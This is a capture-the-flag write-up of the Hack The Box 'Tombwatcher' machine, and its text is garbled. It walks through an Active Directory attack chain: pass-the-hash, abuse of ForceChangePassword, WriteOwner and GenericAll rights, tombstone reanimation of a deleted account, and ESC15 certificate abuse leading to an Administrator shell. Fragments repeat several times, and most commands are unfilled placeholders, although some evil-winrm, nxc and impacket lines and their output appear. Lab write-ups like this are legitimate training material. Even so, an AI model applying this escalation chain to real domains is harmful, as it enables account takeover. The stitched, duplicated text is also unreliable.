
 evil-winrm -i DC01.tombwatcher.htb -u administrator -p 'password' 

*Evil-WinRM* PS C:\Users\Administrator\Documents> dir ../Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        10/5/2026   7:54 PM             34 root.txt

```
After that we can successfully get an ldap shell with `certipy-ad` and the `-ldap-shell` flag as `Administrator` on the server, change their password and then get an `evil-winrm` session. pwned.

## Final Thoughts
>[!Takeaways]
>- Be more vigilant when combing through `certipy-ad` output. There are more juicers than just the direct "Vulnerabilities" sections.
>- If  you have `GenericAll` over an OU that is empty you can either see if deleted accounts/objects used to belong to it or try to inject your own objects for further abuses.
>- Tombstone Reanimation gotta be the coolest sounding thing for a mundane idea. Remember that performing it is easier in powershell than trying to do it on the Linux side.



 -H '3eca34dd13a85db79c03178b7b149621' --shares
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\ansible_dev$:3eca34dd13a85db79c03178b7b149621 
SMB         10.129.232.167  445    DC01             [*] Enumerated shares
SMB         10.129.232.167  445    DC01             Share           Permissions     Remark
SMB         10.129.232.167  445    DC01             -----           -----------     ------
SMB         10.129.232.167  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.167  445    DC01             C$                              Default share
SMB         10.129.232.167  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.167  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.167  445    DC01             SYSVOL          READ            Logon server share 
```
And we confirm that the hash is good by logging in via pass-the-hash over smb on `nxc`. 

![Pasted image 20261002140129.png](/img/user/CTFs/HTB/Images/Tombwatcher%20Images/Pasted%20image%2020261002140129.png)
Bloodhound shows us that as `ansible_dev$` we have the `ForceChangePassword` permission set over user `sam`. This permission set is self explanatory but we'll be able to set Sam's password to whatever we want now.

{{CODE_BLOCK_10}}
We successfully changed `Sam's` password on the server.

![Pasted image 20261002141844.png](/img/user/CTFs/HTB/Images/Tombwatcher%20Images/Pasted%20image%2020261002141844.png)
Next we see that Sam has the `WriteOwner` permission set for user `John`. This will allow us to abuse those permissions to get access as `John`.

{{CODE_BLOCK_11}}
We successfully change owner ship of `John's` user to `Sam`. We can now abuse this by delegating the `GenericAll` Permission set and changing `John's` password from there.

{{CODE_BLOCK_12}}
We then successfully give Sam `GenericAll` permissions over user `John` with `impacket-dacledit`.

{{CODE_BLOCK_13}}
Finally we change `John's` password with `net rpc` and confirm it successfully doing so by logging in over smb with `nxc`.

![Pasted image 20261002142928.png](/img/user/CTFs/HTB/Images/Tombwatcher%20Images/Pasted%20image%2020261002142928.png)
We see that John has two very interesting things tied to his user. One is that he's a member of Remote Management which means he should be able to get a shell on the system. Second is his `GenericAll` permissions over the ADCS OU. This may lead to finding some ADCS exploit under our John user's context.

{{CODE_BLOCK_14}}
And just as suspected, `user.txt` is waiting for us in John's Desktop folder.

## Privilege Escalation (Tombstone + ADCS Abuse)

![Pasted image 20261005133355.png](/img/user/CTFs/HTB/Images/Tombwatcher%20Images/Pasted%20image%2020261005133355.png)
Moving to John's other interesting permission set, we target `GenericAll` over the ADCS OU. 

{{CODE_BLOCK_15}}
Running a basic ldap recursive search against the ADCS OU as `john` we see that it's completely empty. This works as a blank slate for a couple different privilege escalation scenarios. They both involve us creating a new machine object within AD and assigning it to the ADCS OU.

#### Tangent (Object Injection)
{{CODE_BLOCK_16}}
We accomplish this successfully with `impacket-addcomputer` and specifying the OU name inside the `-computer-group` flag.

{{CODE_BLOCK_17}}
since this is an ADCS OU my first instinct is to then run a general ADCS find query for our newly made machine object inside the OU.
{{CODE_BLOCK_18}}
Combing back through the output we see something interesting we missed previously. We see that the `Web Server` template in ADCS gives enrollment rights to a specific account using it's Domain SID rather than username. 

### Tombstone Reanimation

{{CODE_BLOCK_19}}
We can get information on an AD object (in this case an account) using built-in powershell commands from our previous session as `john`. In querying the system with the SID specified from the template in ADCS we see a deleted account for the user `cert_admin`. In that information we see that the account used to reside within the `ADCS` OU. That means if we can make it active again, we will have full control of the account via `John`.

{{CODE_BLOCK_20}}
Since this account is deleted and likely has it's AD recycle bin disabled, we must perform a [Tombstone Reanimation](https://www.ibm.com/docs/en/storage-protect/8.2.2?topic=rwiado-reanimate-tombstone-objects-restoring-from-system-state-backup) on the account in order to make it active again. We do so successfully within Powershell.

{{CODE_BLOCK_21}}
Finally we force change `cert_admin's` password since we've no idea what the original one is and now have control over the user.

{{CODE_BLOCK_22}}
Now when we view the ADCS information for the Web Server template we get two possible vulnerabilities: [ESC15](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) and [ESC17](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc17-enrollee-supplied-subject-for-server-authentication). 


### ESC15
>[!info]
>![Pasted image 20261005143645.png](/img/user/CTFs/HTB/Images/Tombwatcher%20Images/Pasted%20image%2020261005143645.png)
Our template in question not only fills the template prerequisites, but also even is the template used in the example (Web Sever).

{{CODE_BLOCK_23}}
We can execute this vulnerability via `certipy-ad` and specifying the `administrator` as our user and `Client Authentication` as the application policy that we wish to inject which would allow us then to authenticate via this enrollment template with the credential file we generate for `administrator`.

{{CODE_BLOCK_24}}
After that we can successfully get an ldap shell with `certipy-ad` and the `-ldap-shell` flag as `Administrator` on the server, change their password and then get an `evil-winrm` session. pwned.

## Final Thoughts
>[!Takeaways]
>- Be more vigilant when combing through `certipy-ad` output. There are more juicers than just the direct "Vulnerabilities" sections.
>- If  you have `GenericAll` over an OU that is empty you can either see if deleted accounts/objects used to belong to it or try to inject your own objects for further abuses.
>- Tombstone Reanimation gotta be the coolest sounding thing for a mundane idea. Remember that performing it is easier in powershell than trying to do it on the Linux side.



 -computer-pass 'Password123!' -computer-group 'OU=ADCS,DC=tombwatcher,DC=htb' 'tombwatcher.htb/john:Password123!'

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account ATTACKMOD$ with password Password123!.
```
We accomplish this successfully with `impacket-addcomputer` and specifying the OU name inside the `-computer-group` flag.

{{CODE_BLOCK_17}}
since this is an ADCS OU my first instinct is to then run a general ADCS find query for our newly made machine object inside the OU.
{{CODE_BLOCK_18}}
Combing back through the output we see something interesting we missed previously. We see that the `Web Server` template in ADCS gives enrollment rights to a specific account using it's Domain SID rather than username. 

### Tombstone Reanimation

{{CODE_BLOCK_19}}
We can get information on an AD object (in this case an account) using built-in powershell commands from our previous session as `john`. In querying the system with the SID specified from the template in ADCS we see a deleted account for the user `cert_admin`. In that information we see that the account used to reside within the `ADCS` OU. That means if we can make it active again, we will have full control of the account via `John`.

{{CODE_BLOCK_20}}
Since this account is deleted and likely has it's AD recycle bin disabled, we must perform a [Tombstone Reanimation](https://www.ibm.com/docs/en/storage-protect/8.2.2?topic=rwiado-reanimate-tombstone-objects-restoring-from-system-state-backup) on the account in order to make it active again. We do so successfully within Powershell.

{{CODE_BLOCK_21}}
Finally we force change `cert_admin's` password since we've no idea what the original one is and now have control over the user.

{{CODE_BLOCK_22}}
Now when we view the ADCS information for the Web Server template we get two possible vulnerabilities: [ESC15](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) and [ESC17](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc17-enrollee-supplied-subject-for-server-authentication). 


### ESC15
>[!info]
>![Pasted image 20261005143645.png](/img/user/CTFs/HTB/Images/Tombwatcher%20Images/Pasted%20image%2020261005143645.png)
Our template in question not only fills the template prerequisites, but also even is the template used in the example (Web Sever).

{{CODE_BLOCK_23}}
We can execute this vulnerability via `certipy-ad` and specifying the `administrator` as our user and `Client Authentication` as the application policy that we wish to inject which would allow us then to authenticate via this enrollment template with the credential file we generate for `administrator`.

{{CODE_BLOCK_24}}
After that we can successfully get an ldap shell with `certipy-ad` and the `-ldap-shell` flag as `Administrator` on the server, change their password and then get an `evil-winrm` session. pwned.

## Final Thoughts
>[!Takeaways]
>- Be more vigilant when combing through `certipy-ad` output. There are more juicers than just the direct "Vulnerabilities" sections.
>- If  you have `GenericAll` over an OU that is empty you can either see if deleted accounts/objects used to belong to it or try to inject your own objects for further abuses.
>- Tombstone Reanimation gotta be the coolest sounding thing for a mundane idea. Remember that performing it is easier in powershell than trying to do it on the Linux side.



 -H '3eca34dd13a85db79c03178b7b149621' --shares
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\ansible_dev$:3eca34dd13a85db79c03178b7b149621 
SMB         10.129.232.167  445    DC01             [*] Enumerated shares
SMB         10.129.232.167  445    DC01             Share           Permissions     Remark
SMB         10.129.232.167  445    DC01             -----           -----------     ------
SMB         10.129.232.167  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.167  445    DC01             C$                              Default share
SMB         10.129.232.167  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.167  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.167  445    DC01             SYSVOL          READ            Logon server share 
```
And we confirm that the hash is good by logging in via pass-the-hash over smb on `nxc`. 

![Pasted image 20261002140129.png](/img/user/CTFs/HTB/Images/Tombwatcher%20Images/Pasted%20image%2020261002140129.png)
Bloodhound shows us that as `ansible_dev$` we have the `ForceChangePassword` permission set over user `sam`. This permission set is self explanatory but we'll be able to set Sam's password to whatever we want now.

{{CODE_BLOCK_10}}
We successfully changed `Sam's` password on the server.

![Pasted image 20261002141844.png](/img/user/CTFs/HTB/Images/Tombwatcher%20Images/Pasted%20image%2020261002141844.png)
Next we see that Sam has the `WriteOwner` permission set for user `John`. This will allow us to abuse those permissions to get access as `John`.

{{CODE_BLOCK_11}}
We successfully change owner ship of `John's` user to `Sam`. We can now abuse this by delegating the `GenericAll` Permission set and changing `John's` password from there.

{{CODE_BLOCK_12}}
We then successfully give Sam `GenericAll` permissions over user `John` with `impacket-dacledit`.

{{CODE_BLOCK_13}}
Finally we change `John's` password with `net rpc` and confirm it successfully doing so by logging in over smb with `nxc`.

![Pasted image 20261002142928.png](/img/user/CTFs/HTB/Images/Tombwatcher%20Images/Pasted%20image%2020261002142928.png)
We see that John has two very interesting things tied to his user. One is that he's a member of Remote Management which means he should be able to get a shell on the system. Second is his `GenericAll` permissions over the ADCS OU. This may lead to finding some ADCS exploit under our John user's context.

{{CODE_BLOCK_14}}
And just as suspected, `user.txt` is waiting for us in John's Desktop folder.

## Privilege Escalation (Tombstone + ADCS Abuse)

![Pasted image 20261005133355.png](/img/user/CTFs/HTB/Images/Tombwatcher%20Images/Pasted%20image%2020261005133355.png)
Moving to John's other interesting permission set, we target `GenericAll` over the ADCS OU. 

{{CODE_BLOCK_15}}
Running a basic ldap recursive search against the ADCS OU as `john` we see that it's completely empty. This works as a blank slate for a couple different privilege escalation scenarios. They both involve us creating a new machine object within AD and assigning it to the ADCS OU.

#### Tangent (Object Injection)
{{CODE_BLOCK_16}}
We accomplish this successfully with `impacket-addcomputer` and specifying the OU name inside the `-computer-group` flag.

{{CODE_BLOCK_17}}
since this is an ADCS OU my first instinct is to then run a general ADCS find query for our newly made machine object inside the OU.
{{CODE_BLOCK_18}}
Combing back through the output we see something interesting we missed previously. We see that the `Web Server` template in ADCS gives enrollment rights to a specific account using it's Domain SID rather than username. 

### Tombstone Reanimation

{{CODE_BLOCK_19}}
We can get information on an AD object (in this case an account) using built-in powershell commands from our previous session as `john`. In querying the system with the SID specified from the template in ADCS we see a deleted account for the user `cert_admin`. In that information we see that the account used to reside within the `ADCS` OU. That means if we can make it active again, we will have full control of the account via `John`.

{{CODE_BLOCK_20}}
Since this account is deleted and likely has it's AD recycle bin disabled, we must perform a [Tombstone Reanimation](https://www.ibm.com/docs/en/storage-protect/8.2.2?topic=rwiado-reanimate-tombstone-objects-restoring-from-system-state-backup) on the account in order to make it active again. We do so successfully within Powershell.

{{CODE_BLOCK_21}}
Finally we force change `cert_admin's` password since we've no idea what the original one is and now have control over the user.

{{CODE_BLOCK_22}}
Now when we view the ADCS information for the Web Server template we get two possible vulnerabilities: [ESC15](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) and [ESC17](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc17-enrollee-supplied-subject-for-server-authentication). 


### ESC15
>[!info]
>![Pasted image 20261005143645.png](/img/user/CTFs/HTB/Images/Tombwatcher%20Images/Pasted%20image%2020261005143645.png)
Our template in question not only fills the template prerequisites, but also even is the template used in the example (Web Sever).

{{CODE_BLOCK_23}}
We can execute this vulnerability via `certipy-ad` and specifying the `administrator` as our user and `Client Authentication` as the application policy that we wish to inject which would allow us then to authenticate via this enrollment template with the credential file we generate for `administrator`.

{{CODE_BLOCK_24}}
After that we can successfully get an ldap shell with `certipy-ad` and the `-ldap-shell` flag as `Administrator` on the server, change their password and then get an `evil-winrm` session. pwned.

## Final Thoughts
>[!Takeaways]
>- Be more vigilant when combing through `certipy-ad` output. There are more juicers than just the direct "Vulnerabilities" sections.
>- If  you have `GenericAll` over an OU that is empty you can either see if deleted accounts/objects used to belong to it or try to inject your own objects for further abuses.
>- Tombstone Reanimation gotta be the coolest sounding thing for a mundane idea. Remember that performing it is easier in powershell than trying to do it on the Linux side.



